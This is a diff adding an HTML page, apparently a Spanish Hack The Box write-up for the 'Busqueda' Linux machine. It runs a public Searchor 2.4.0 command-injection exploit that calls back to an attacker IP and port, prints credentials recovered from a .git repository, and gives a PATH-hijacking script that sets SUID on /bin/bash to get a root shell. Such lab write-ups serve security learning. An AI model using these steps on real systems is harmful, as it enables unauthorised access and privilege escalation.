@@ -1,0 +1,111 @@
+<!doctype html>
+<html lang="es">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <link rel="icon" type="image/png" href="/favicon-monkey.png?v=20260601" />
+    <title>RuyzTz7 | Busqueda HTB</title>
+    <link rel="stylesheet" href="/section.css" />
+  </head>
+  <body>
+    <main class="section-shell writeup-detail-shell">
+      <a class="back-link" href="/writeups/linux.html">~/writeups/linux</a>
+
+      <section class="writeup-detail-hero">
+        <img src="/writeups/assets/busqueda/pasted-20260406120225.png" alt="Busqueda HTB" />
+        <div>
+          <p class="eyebrow">HTB / machines / Linux</p>
+          <h1>Busqueda</h1>
+          <div class="tag-list" aria-label="Tags">
+            <span>searchor</span>
+            <span>sudoers</span>
+            <span>git</span>
+            <span>path_hijacking</span>
+          </div>
+        </div>
+      </section>
+
+      <article class="writeup-article">
+        <section class="writeup-section">
+          <h2>Índice</h2>
+          <ul>
+            <li><code>Enumeración</code>: Aplicación Searchor expuesta en la web</li>
+            <li><code>Explotación</code>: Command injection en Searchor 2.4.0 mediante PoC</li>
+            <li><code>Movimiento lateral</code>: Repositorio <code>.git</code> revela credenciales y subdominio Gitea</li>
+            <li><code>Escalada de Privilegios</code>: Sudoers sobre <code>system-checkup.py</code> y path hijacking</li>
+          </ul>
+        </section>
+        <section class="writeup-section">
+          <h2>Enumeración</h2>
+          <img class="writeup-image" src="/writeups/assets/busqueda/pasted-20260406120245.png" alt="Busqueda HTB" />
+          <img class="writeup-image" src="/writeups/assets/busqueda/pasted-20260406122535.png" alt="Busqueda HTB" />
+          <img class="writeup-image" src="/writeups/assets/busqueda/pasted-20260406122556.png" alt="Busqueda HTB" />
+        </section>
+        <section class="writeup-section">
+          <h2>Explotación</h2>
+          <p><a href="https://raw.githubusercontent.com/nikn0laty/Exploit-for-Searchor-2.4.0-Arbitrary-CMD-Injection/refs/heads/main/exploit.sh">Exploit de GitHub</a></p>
+          <div class="code-card">
+            <h3>Exploit</h3>
+            <pre><code>chmod +x exploit.sh
+bash exploit.sh http://searcher.htb:80 10.10.16.178 4443</code></pre>
+          </div>
+          <img class="writeup-image" src="/writeups/assets/busqueda/pasted-20260406122459.png" alt="Busqueda HTB" />
+        </section>
+        <section class="writeup-section">
+          <h2>Escalada de Privilegios</h2>
+          <img class="writeup-image" src="/writeups/assets/busqueda/pasted-20260406124259.png" alt="Busqueda HTB" />
+          <img class="writeup-image" src="/writeups/assets/busqueda/pasted-20260406124350.png" alt="Busqueda HTB" />
+          <div class="code-card">
+            <h3>Buscar repositorio .git</h3>
+            <pre><code>find . -name \*.git\* 2&gt;/dev/null</code></pre>
+          </div>
+          <img class="writeup-image" src="/writeups/assets/busqueda/pasted-20260406124444.png" alt="Busqueda HTB" />
+          <img class="writeup-image" src="/writeups/assets/busqueda/pasted-20260406124834.png" alt="Busqueda HTB" />
+          <div class="code-card">
+            <h3>Encontramos credenciales y subdominio</h3>
+            <pre><code># Credenciales -&gt; cody:jh1usoih2bkjaspwe92
+# Subdominio -&gt; gitea.searcher.htb
+# Reutilizar credenciales para svc
+sudo -l</code></pre>
+          </div>
+          <img class="writeup-image" src="/writeups/assets/busqueda/pasted-20260406125001.png" alt="Busqueda HTB" />
+          <div class="code-card">
+            <h3>Ejecutamos el script</h3>
+            <pre><code>sudo /usr/bin/python3 /opt/scripts/system-checkup.py *</code></pre>
+          </div>
+          <img class="writeup-image" src="/writeups/assets/busqueda/pasted-20260406141712.png" alt="Busqueda HTB" />
+          <div class="code-card">
+            <h3>Enumerar scripts</h3>
+            <pre><code>ls /opt/scripts/</code></pre>
+          </div>
+          <img class="writeup-image" src="/writeups/assets/busqueda/pasted-20260406141957.png" alt="Busqueda HTB" />
+          <div class="code-card">
+            <h3>Modificar el PATH para que cuando se ejecute el archivo lea nuestro binario y se ejecute</h3>
+            <pre><code>cd /tmp
+export PATH=/tmp:$PATH
+echo $PATH</code></pre>
+          </div>
+          <img class="writeup-image" src="/writeups/assets/busqueda/pasted-20260406141801.png" alt="Busqueda HTB" />
+          <div class="code-card">
+            <h3>Path Hijacking</h3>
+            <pre><code>nano full-checkup.sh
+#!/bin/bash
+chmod u+s /bin/bash
+# Conexión a la bash como root: bash -p</code></pre>
+          </div>
+          <img class="writeup-image" src="/writeups/assets/busqueda/pasted-20260406141619.png" alt="Busqueda HTB" />
+        </section>
+        <section class="writeup-section">
+          <h2>Tags</h2>
+          <div class="tag-list">
+            <span>searchor</span>
+            <span>sudoers</span>
+            <span>git</span>
+            <span>path_hijacking</span>
+            <span>find</span>
+          </div>
+        </section>
+      </article>
+    </main>
+  </body>
+</html>
